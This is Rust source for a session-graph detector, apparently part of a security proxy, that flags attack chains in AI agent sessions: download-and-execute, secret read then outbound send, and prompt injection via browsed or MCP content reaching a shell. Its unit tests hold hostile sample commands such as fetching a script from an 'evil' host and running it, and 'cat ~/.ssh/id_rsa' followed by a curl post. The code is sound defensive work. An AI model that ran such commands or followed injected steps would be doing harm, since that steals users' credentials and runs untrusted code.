//! Session graph & attack-chain detector — Layer 3 of the SafeRouter model.
//!
//! Instead of scanning each event in isolation, we maintain a directed graph
//! of actions inside a single session and match it against known attack-chain
//! patterns. This is the architectural answer to "каждый шаг выглядит
//! легитимно, опасность только в композиции".
//!
//! Each event is a node: `(capability, asset_class, source, taint, ts)`.
//! Edges connect events that share artifact ids (one produces input the other
//! consumes) or are causally adjacent within a small time window.
//!
//! Chain patterns we detect:
//!
//!   A. fetch -> write -> execute           (download-and-execute, classic)
//!   B. read-secret -> outbound-send        (exfiltration via response context)
//!   C. browse -> extract-command -> shell   (indirect prompt injection)
//!   D. mcp-output -> shell|network          (malicious MCP chain)
//!   E. long-dwell -> new-capability         (delayed trigger, 3+ day gap)
//!   F. taint-leap                            (any tainted artifact reaches Execute)

use std::collections::HashMap;

use serde::{Deserialize, Serialize};

use crate::asset::{AssetClass, Capability, Source};

/// Stable id for an action node in the session graph.
pub type NodeId = u64;

/// One event node in the session graph.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionEvent {
    pub id: NodeId,
    pub capability: Capability,
    pub asset: AssetClass,
    pub source: Source,
    pub tainted: bool,
    /// Unix ts seconds when observed.
    pub ts: u64,
    /// Artifact ids involved in this event (path, url, sha, etc.).
    pub artifact_ids: Vec<String>,
    /// Free-form label (tool name + first chunk of input) for audit.
    pub label: String,
}

/// Known attack-chain pattern. `name` is the rule id reported by the detector.
#[derive(Debug, Clone, Copy)]
pub struct ChainPattern {
    pub id: &'static str,
    pub severity: u32,
    pub description: &'static str,
}

pub const PAT_FETCH_WRITE_EXECUTE: ChainPattern = ChainPattern {
    id: "chain-fetch-write-execute",
    severity: 95,
    description: "fetch -> write -> execute: classic download-and-execute",
};
pub const PAT_READ_SECRET_OUTBOUND: ChainPattern = ChainPattern {
    id: "chain-read-secret-outbound",
    severity: 90,
    description: "read secret asset -> outbound send: exfiltration via context",
};
pub const PAT_BROWSE_EXTRACT_SHELL: ChainPattern = ChainPattern {
    id: "chain-browse-extract-shell",
    severity: 95,
    description: "browse -> extract command from web -> shell: indirect prompt injection",
};
pub const PAT_MCP_TO_SHELL_NET: ChainPattern = ChainPattern {
    id: "chain-mcp-to-shell-net",
    severity: 90,
    description: "mcp output -> shell or network post: malicious MCP chain",
};
pub const PAT_TAINT_LEAP_EXECUTE: ChainPattern = ChainPattern {
    id: "chain-taint-leap-execute",
    severity: 95,
    description: "tainted artifact reaches execute: indirect-command injection",
};
pub const PAT_LONG_DWELL_NEW_CAP: ChainPattern = ChainPattern {
    id: "chain-long-dwell-new-capability",
    severity: 70,
    description: "long dwell (>3d) then new capability: delayed trigger",
};

/// Detected chain — reported to governor & audit log.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ChainHit {
    pub rule_id: String,
    pub severity: u32,
    pub description: String,
    pub events: Vec<NodeId>,
}

/// In-memory session graph. One per proxy session. Not persisted by design —
/// chains live within a session. Long-running sessions can rebuild the graph
/// from history.rs JSONL if needed.
pub struct SessionGraph {
    nodes: Vec<SessionEvent>,
    /// artifact_id -> list of node ids that touched it (causal edge producer/consumer).
    artifact_index: HashMap<String, Vec<NodeId>>,
    /// Last-seen capability set for behavioral baseline anomaly detection.
    seen_capabilities: Vec<Capability>,
    /// Last seen ts (for long-dwell detection).
    last_ts: u64,
    session_start_ts: u64,
}

impl Default for SessionGraph {
    fn default() -> Self {
        Self::new()
    }
}

impl SessionGraph {
    pub fn new() -> Self {
        Self {
            nodes: Vec::new(),
            artifact_index: HashMap::new(),
            seen_capabilities: Vec::new(),
            last_ts: 0,
            session_start_ts: now_ts(),
        }
    }

    pub fn record(&mut self, ev: SessionEvent) {
        for aid in &ev.artifact_ids {
            self.artifact_index
                .entry(aid.clone())
                .or_default()
                .push(ev.id);
        }
        if !self.seen_capabilities.contains(&ev.capability) {
            self.seen_capabilities.push(ev.capability);
        }
        if ev.ts > self.last_ts {
            self.last_ts = ev.ts;
        }
        self.nodes.push(ev);
    }

    pub fn len(&self) -> usize {
        self.nodes.len()
    }

    pub fn is_empty(&self) -> bool {
        self.nodes.is_empty()
    }

    /// Walk the graph and emit any chain-pattern hits. Accumulates across
    /// all patterns. Idempotent — re-runnable as the graph grows.
    pub fn detect_chains(&self) -> Vec<ChainHit> {
        let mut hits = Vec::new();
        hits.extend(self.detect_fetch_write_execute());
        hits.extend(self.detect_read_secret_outbound());
        hits.extend(self.detect_browse_extract_shell());
        hits.extend(self.detect_mcp_to_shell_or_net());
        hits.extend(self.detect_taint_leap());
        hits.extend(self.detect_long_dwell_new_cap());
        hits
    }

    // ----- pattern A: fetch -> write -> execute ---------------------------

    fn detect_fetch_write_execute(&self) -> Vec<ChainHit> {
        let mut out = Vec::new();
        // For each execute node, look back for a write node that wrote
        // something fetched from external/web less than N back, sharing an
        // artifact id.
        for exec in self.nodes.iter().filter(|n| n.capability == Capability::Execute) {
            for write_node in self
                .nodes
                .iter()
                .filter(|n| n.capability == Capability::WriteFile && n.ts <= exec.ts)
            {
                // Shared artifact between write and execute?
                let shared = write_node
                    .artifact_ids
                    .iter()
                    .filter(|a| exec.artifact_ids.contains(a))
                    .count();
                if shared == 0 {
                    continue;
                }
                // Find a fetch feeding the write.
                for fetch in self
                    .nodes
                    .iter()
                    .filter(|n| matches!(n.capability, Capability::NetworkFetch | Capability::BrowserDownload)
                        && n.ts <= write_node.ts)
                {
                    if fetch.artifact_ids.iter().any(|a| write_node.artifact_ids.contains(a)) {
                        out.push(ChainHit {
                            rule_id: PAT_FETCH_WRITE_EXECUTE.id.to_string(),
                            severity: PAT_FETCH_WRITE_EXECUTE.severity,
                            description: PAT_FETCH_WRITE_EXECUTE.description.to_string(),
                            events: vec![fetch.id, write_node.id, exec.id],
                        });
                        break;
                    }
                }
            }
        }
        out
    }

    // ----- pattern B: read secret -> outbound send ------------------------

    fn detect_read_secret_outbound(&self) -> Vec<ChainHit> {
        let mut out = Vec::new();
        for send in self
            .nodes
            .iter()
            .filter(|n| n.capability == Capability::NetworkPost)
        {
            // Did a secret read happen *before* this send in the same session?
            let secret_reads: Vec<_> = self
                .nodes
                .iter()
                .filter(|n| n.ts <= send.ts
                    && n.capability == Capability::SecretAccess
                    && matches!(
                        n.asset,
                        AssetClass::Credential
                            | AssetClass::WalletData
                            | AssetClass::BrowserData
                            | AssetClass::Keychain
                            | AssetClass::CloudMetadata
                    ))
                .collect();
            if !secret_reads.is_empty() {
                let mut events: Vec<NodeId> = secret_reads.iter().map(|n| n.id).collect();
                events.push(send.id);
                out.push(ChainHit {
                    rule_id: PAT_READ_SECRET_OUTBOUND.id.to_string(),
                    severity: PAT_READ_SECRET_OUTBOUND.severity,
                    description: PAT_READ_SECRET_OUTBOUND.description.to_string(),
                    events,
                });
            }
        }
        out
    }

    // ----- pattern C: browse -> extract-command -> shell ------------------

    fn detect_browse_extract_shell(&self) -> Vec<ChainHit> {
        let mut out = Vec::new();
        for exec in self.nodes.iter().filter(|n| n.capability == Capability::Execute) {
            // Find any web-sourced or tainted artifact consumed by this exec.
            let precondition = exec.tainted
                || exec.source == Source::Web
                || exec.source == Source::Mcp
                || exec.source == Source::Provider;
            if !precondition {
                continue;
            }
            // Walk back via artifact index: a browse or NetworkFetch node that
            // produced an artifact the exec consumes.
            for aid in &exec.artifact_ids {
                if let Some(producers) = self.artifact_index.get(aid) {
                    for &pid in producers {
                        if let Some(p) = self.nodes.iter().find(|n| n.id == pid) {
                            if matches!(p.capability, Capability::BrowserNavigate | Capability::NetworkFetch)
                                && matches!(p.source, Source::Web | Source::Provider | Source::Mcp)
                                && p.ts <= exec.ts
                            {
                                out.push(ChainHit {
                                    rule_id: PAT_BROWSE_EXTRACT_SHELL.id.to_string(),
                                    severity: PAT_BROWSE_EXTRACT_SHELL.severity,
                                    description: PAT_BROWSE_EXTRACT_SHELL.description.to_string(),
                                    events: vec![p.id, exec.id],
                                });
                            }
                        }
                    }
                }
            }
        }
        out
    }

    // ----- pattern D: mcp output -> shell or network post -----------------

    fn detect_mcp_to_shell_or_net(&self) -> Vec<ChainHit> {
        let mut out = Vec::new();
        let mcp_nodes: Vec<_> = self
            .nodes
            .iter()
            .filter(|n| n.capability == Capability::McpInvoke || n.source == Source::Mcp)
            .collect();
        for exec in self
            .nodes
            .iter()
            .filter(|n| matches!(n.capability, Capability::Execute | Capability::NetworkPost))
        {
            if let Some(_mcp) = mcp_nodes.iter().find(|m| m.ts <= exec.ts) {
                // Shared artifact or direct adjacency.
                let shared = exec
                    .artifact_ids
                    .iter()
                    .any(|a| mcp_nodes.iter().any(|m| m.artifact_ids.contains(a)));
                if shared {
                    out.push(ChainHit {
                        rule_id: PAT_MCP_TO_SHELL_NET.id.to_string(),
                        severity: PAT_MCP_TO_SHELL_NET.severity,
                        description: PAT_MCP_TO_SHELL_NET.description.to_string(),
                        events: vec![exec.id],
                    });
                }
            }
        }
        out
    }

    // ----- pattern F: taint-leap to execute --------------------------------

    fn detect_taint_leap(&self) -> Vec<ChainHit> {
        let mut out = Vec::new();
        for exec in self.nodes.iter().filter(|n| n.capability == Capability::Execute) {
            if exec.tainted {
                out.push(ChainHit {
                    rule_id: PAT_TAINT_LEAP_EXECUTE.id.to_string(),
                    severity: PAT_TAINT_LEAP_EXECUTE.severity,
                    description: PAT_TAINT_LEAP_EXECUTE.description.to_string(),
                    events: vec![exec.id],
                });
            }
        }
        out
    }

    // ----- pattern E: long-dwell -> new capability ------------------------

    fn detect_long_dwell_new_cap(&self) -> Vec<ChainHit> {
        let mut out = Vec::new();
        let now = now_ts();
        let session_age_days = (now.saturating_sub(self.session_start_ts)) / 86_400;
        if session_age_days >= 3 {
            // Detect any node whose capability wasn't seen in the first 24h
            // (we approximate "first day baseline" as the set of capabilities
            // observed with ts within 24h from session_start_ts).
            let day_one_cutoff = self.session_start_ts.saturating_add(86_400);
            let baseline: Vec<Capability> = self
                .nodes
                .iter()
                .filter(|n| n.ts <= day_one_cutoff)
                .map(|n| n.capability)
                .filter(|c| !matches!(c, Capability::ReadFile))
                .collect();
            for n in self.nodes.iter().filter(|n| n.ts > day_one_cutoff) {
                if !baseline.contains(&n.capability)
                    && !matches!(n.capability, Capability::ReadFile | Capability::WriteFile)
                {
                    out.push(ChainHit {
                        rule_id: PAT_LONG_DWELL_NEW_CAP.id.to_string(),
                        severity: PAT_LONG_DWELL_NEW_CAP.severity,
                        description: PAT_LONG_DWELL_NEW_CAP.description.to_string(),
                        events: vec![n.id],
                    });
                }
            }
        }
        out
    }
}

fn now_ts() -> u64 {
    use std::time::{SystemTime, UNIX_EPOCH};
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

#[cfg(test)]
#[allow(clippy::too_many_arguments)]
mod tests {
    use super::*;

    fn ev(id: NodeId, cap: Capability, asset: AssetClass, source: Source, tainted: bool, ts: u64, aids: &[&str], label: &str) -> SessionEvent {
        SessionEvent {
            id,
            capability: cap,
            asset,
            source,
            tainted,
            ts,
            artifact_ids: aids.iter().map(|s| s.to_string()).collect(),
            label: label.to_string(),
        }
    }

    #[test]
    fn detects_classic_fetch_write_execute_chain() {
        let mut g = SessionGraph::new();
        g.record(ev(1, Capability::NetworkFetch, AssetClass::External, Source::Web, true, 1_000, &["u:https://evil/x.sh"], "webfetch evil/x.sh"));
        g.record(ev(2, Capability::WriteFile, AssetClass::Temp, Source::Internal, true, 1_010, &["p:/tmp/x.sh", "u:https://evil/x.sh"], "write /tmp/x.sh"));
        g.record(ev(3, Capability::Execute, AssetClass::Executable, Source::Internal, true, 1_020, &["p:/tmp/x.sh"], "bash /tmp/x.sh"));
        let hits = g.detect_chains();
        assert!(hits.iter().any(|h| h.rule_id == "chain-fetch-write-execute"), "hits: {:?}", hits);
    }

    #[test]
    fn detects_secret_read_then_outbound_send() {
        let mut g = SessionGraph::new();
        g.record(ev(1, Capability::SecretAccess, AssetClass::Credential, Source::Provider, true, 1_000, &["p:~/.ssh/id_rsa"], "cat ~/.ssh/id_rsa"));
        g.record(ev(2, Capability::NetworkPost, AssetClass::External, Source::Internal, true, 1_020, &["u:example.com"], "curl -d @- example.com"));
        let hits = g.detect_chains();
        assert!(hits.iter().any(|h| h.rule_id == "chain-read-secret-outbound"), "hits: {:?}", hits);
    }

    #[test]
    fn detects_prompt_injection_through_browse_extract_shell() {
        let mut g = SessionGraph::new();
        g.record(ev(1, Capability::BrowserNavigate, AssetClass::External, Source::Web, true, 1_000, &["u:example.com/docs"], "browse docs"));
        g.record(ev(2, Capability::Execute, AssetClass::Executable, Source::Web, true, 1_020, &["u:example.com/docs", "p:/tmp/cache.sh"], "bash /tmp/cache.sh"));
        let hits = g.detect_chains();
        assert!(hits.iter().any(|h| h.rule_id == "chain-browse-extract-shell"), "hits: {:?}", hits);
    }

    #[test]
    fn detects_taint_leap_to_execute() {
        let mut g = SessionGraph::new();
        g.record(ev(1, Capability::Execute, AssetClass::Executable, Source::Internal, true, 1_000, &["p:/tmp/x.sh"], "bash /tmp/x.sh"));
        let hits = g.detect_chains();
        assert!(hits.iter().any(|h| h.rule_id == "chain-taint-leap-execute"));
    }

    #[test]
    fn benign_session_has_no_hits() {
        let mut g = SessionGraph::new();
        g.record(ev(1, Capability::ReadFile, AssetClass::Project, Source::User, false, 1_000, &["p:./src/main.rs"], "read main.rs"));
        g.record(ev(2, Capability::WriteFile, AssetClass::Project, Source::User, false, 1_010, &["p:./src/main.rs"], "edit main.rs"));
        g.record(ev(3, Capability::Execute, AssetClass::Executable, Source::User, false, 1_020, &["p:cargo"], "cargo test"));
        let hits = g.detect_chains();
        assert!(hits.is_empty(), "expected no hits, got {:?}", hits);
    }

    #[test]
    fn mcp_to_execute_chain() {
        let mut g = SessionGraph::new();
        g.record(ev(1, Capability::McpInvoke, AssetClass::Unknown, Source::Mcp, true, 1_000, &["mcp:out"], "mcp tool invoked"));
        g.record(ev(2, Capability::Execute, AssetClass::Executable, Source::Internal, true, 1_020, &["mcp:out", "p:/tmp/x.sh"], "bash /tmp/x.sh"));
        let hits = g.detect_chains();
        assert!(hits.iter().any(|h| h.rule_id == "chain-mcp-to-shell-net"));
    }

    #[test]
    fn empty_graph_no_hits() {
        let g = SessionGraph::new();
        assert!(g.detect_chains().is_empty());
        assert!(g.is_empty());
    }
}